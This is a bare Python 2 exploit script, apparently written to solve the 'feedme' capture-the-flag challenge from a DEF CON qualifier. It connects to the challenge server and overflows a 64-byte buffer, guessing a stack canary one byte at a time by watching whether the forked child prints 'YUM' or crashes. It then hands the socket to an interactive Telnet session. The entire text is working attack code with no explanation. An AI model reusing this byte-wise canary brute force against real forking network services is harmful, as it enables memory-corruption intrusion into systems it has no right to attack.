from s0ngsari import *

def recvuntil(t):
        data = ''
        while not data.endswith(t):
                tmp = s.recv(1)
                if not tmp: break
                data += tmp
        return data

HOST = "feedme_47aa9b0d8ad186754acd4bece3d6a177.quals.shallweplayaga.me"
PORT = 4092

s = socket(AF_INET,SOCK_STREAM)
s.connect((HOST,PORT))


first = second = third = fourth = 0x00




for first in range(0x00,0xff):
	s.send("A"*64 + chr(first))
	print recvuntil("FEED ME!")
	s.send("A"*64 + "\n")
	if recvuntil("Child exit.").find("YUM") != -1:
		print "[*] Found First Byte: 0x%02x" %first
		break

for second in range(0x00,0xff):
	s.send("A"*64 + chr(first) + chr(second))
	print recvuntil("FEED ME!")
	s.send("A"*64 + "\n")
	if recvuntil("Child exit.").find("YUM") != -1:
		print "[*] Found second byte: 0x%02x" %second
		break
		
for third in range(0x00,0xff):
	s.send("A"*64 + chr(first) + chr(second) + chr(third))
	print recvuntil("FEED ME!")
	s.send("A"*64 + "\n")
	if recvuntil("Child exit.").find("YUM") != -1:
		print "[*] Found third byte: 0x%02x" %third
		break

for fourth in range(0x00,0xff):
	s.send("A"*64 + chr(first) + chr(second) + chr(third) + chr(fourth))
	print recvuntil("FEED ME!")
	s.send("A"*64 + "\n")
	if recvuntil("Child exit.").find("YUM") != -1:
		print "[*] Found fourth byte: 0x%02x" % fourth
		break



t = Telnet()
t.sock = s
t.interact()
